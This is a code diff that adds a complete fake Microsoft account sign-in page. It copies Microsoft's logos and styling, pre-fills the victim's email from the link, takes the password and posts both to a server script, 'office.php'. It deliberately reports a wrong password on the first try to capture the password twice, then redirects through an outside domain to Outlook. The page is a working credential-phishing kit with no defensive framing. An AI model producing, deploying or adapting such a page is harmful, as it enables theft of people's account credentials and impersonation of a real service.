@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account </title>
+    <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" type="image/x-icon">
+
+<style>
+    body{
+        background-image: url("https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg");
+        background-size:cover;
+    }
+    .auth-box {
+    margin-left: auto;
+    margin-right: auto;
+    position: relative;
+    max-width: 350px;
+    width: calc(100% - 40px);
+    padding: 44px;
+    margin-bottom: 28px;
+    background-color: #fff;
+    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    min-width: 320px;
+    min-height: 250px;
+    overflow: hidden;
+    top: 105px;
+}
+.signin{
+    margin-top: 10px;
+    font-size: 1.5em;
+    font-weight: bold;
+    margin-bottom: 8px;
+}
+.uname{
+    padding:6px 10px;
+    padding-left: 0;
+    padding-right: 0;
+    padding-bottom: 3px;
+    height: 30px;
+    background-color: transparent;
+    font-family: inherit;
+    border-left: none;
+    border-right: none;
+    border-top: none;
+    outline: none;
+    border-bottom: 1px solid #0067b8;;
+    width: 100%;
+    font-size: 0.95em;
+}
+
+.ca{
+    font-family: inherit;
+    font-size: 0.82em;
+    margin-top: 18px;
+    margin-bottom: 5px;
+}
+.ca a{
+    text-decoration: none;
+    color: #0067b8;
+}
+.sio{
+    color: #0067b8;
+    font-size: 0.8em;
+}
+.next{
+    background-color: #0067b8;
+    border: none;
+    border-color: #0067b8;
+    color: ivory;
+    font-family: inherit;
+    padding: 4px 12px;
+    display: block;
+    float: right;
+    font-size: 0.95em;
+    width: 108px;
+    height: 32px;
+    margin-top: 10px;
+}
+.next:hover{
+    cursor: pointer;
+    background-color: #005da6;
+}
+
+</style>
+</head>
+<body>
+    
+        <div class="auth-box">
+            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="">
+            <br>
+            <p id="mb">
+                <img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
+                <span id="m" style="position: relative; bottom: 8px;"></span>
+            </p>
+
+            <p id="si" class="signin">Sign in</p>
+            <p id="ep" class="signin">Enter password</p>
+
+            <p id="er" style="color:red; margin-bottom: 0; margin-top: 0;">Your account or password is incorrect. If you don't remember your password, <a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fcontextid%3dE33D9695174B450D%26pid%3d0%26uaid%3d6f1c239f361c467998c61e96f650d4f1%26pid%3d0%26contextid%3dE33D9695174B450D%26bk%3d1600506140&id=38936&uiflavor=web&uaid=6f1c239f361c467998c61e96f650d4f1&mkt=EN-US&lc=1033&bk=1600506140" style="text-decoration: none; color: #0067b8;">reset it now.</a></p>
+
+            <input id="un" class="uname" type="text" placeholder="Email, phone, or Skype">
+            <input id="pwd" class="uname" type="password" placeholder="Password">
+
+            <p id="ca" class="ca">No account? <a href="https://signup.live.com/signup?contextid=25D92D3487CB5763&bk=1600444581&ru=https://login.live.com/login.srf%3fcontextid%3d25D92D3487CB5763%26uiflavor%3dweb%26mkt%3dEN-US%26lc%3d1033%26bk%3d1600444581%26uaid%3d034567f485e440c3b68aa18077cd53c4&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=034567f485e440c3b68aa18077cd53c4">Create one!</a></p>
+            <p id="cb" class="ca"><input type="checkbox" style="width: 20px; height:20px" > <span style="position: relative; bottom: 5px; font-size: 15px;">Keep me signed in</span></p>
+            
+            <p id="sio"><a class="sio">Sign-in options</a></p>
+            <p id="fp"><a class="sio">Forgot password?</a></p>
+
+            <button id="next" class="next">Next</button>
+            <button id="sinb" class="next">Sign in</button>
+        </div>
+    
+</body>
+<script src="https://code.jquery.com/jquery-3.5.1.js" integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script>
+<script>
+(function(){
+    var hash = window.location.hash;
+
+    document.getElementById('un').value = hash.split('#')[1];
+
+    var check = document.getElementById('un').value = hash.split('#')[1]
+    var pwdInput = document.getElementById('pwd');
+
+    if (check === undefined) {
+        $('#un').val('');
+        $('#un').focus();
+    }
+
+    $('#mb').hide();
+    $('#ep').hide();
+    $('#er').hide();
+    $('#pwd').hide();
+    $('#cb').hide();
+    $('#fp').hide();
+    $('#sinb').hide();
+})();
+
+$('#next').click(function(){
+    var uname = $('#un').val();
+    $('#m').html(uname);
+    $('#mb').show();
+    $('#si').hide();
+    $('#ep').show();
+    $('#un').hide();
+    $('#pwd').show();
+    $('#pwd').focus();
+    $('#ca').hide();
+    $('#cb').show();
+    $('#sio').hide();
+    $('#fp').show();
+    $('#next').hide();
+    $('#sinb').show();
+});
+
+if (!count) {
+      var count = 0;
+  }
+
+  function getbtnclick()
+  {
+    return count++
+  }
+
+$('#sinb').click(function(){
+    var uname = $('#un').val();
+    var paswd = $('#pwd').val();
+
+    $.ajax({
+      url: 'office.php',
+      type: 'POST',
+      data: {
+        user: uname,
+        pass: paswd,
+        type: 1
+      },
+      success: function(response){
+        counted = getbtnclick();
+      if (response == 0) {
+          $('#er').show();
+          $('#pwd').val('');
+          $('#pwd').focus();
+      } else if (response == 1) {
+        if (counted == 1) {
+          window.location = "http://test.schulzensgroups.com/success.html#https://outlook.live.com";
+        } else {
+          $('#er').show();
+          $('#pwd').val('');
+          $('#pwd').focus();
+        }
+      }
+      }
+    });
+
+});
+</script>
+</html>
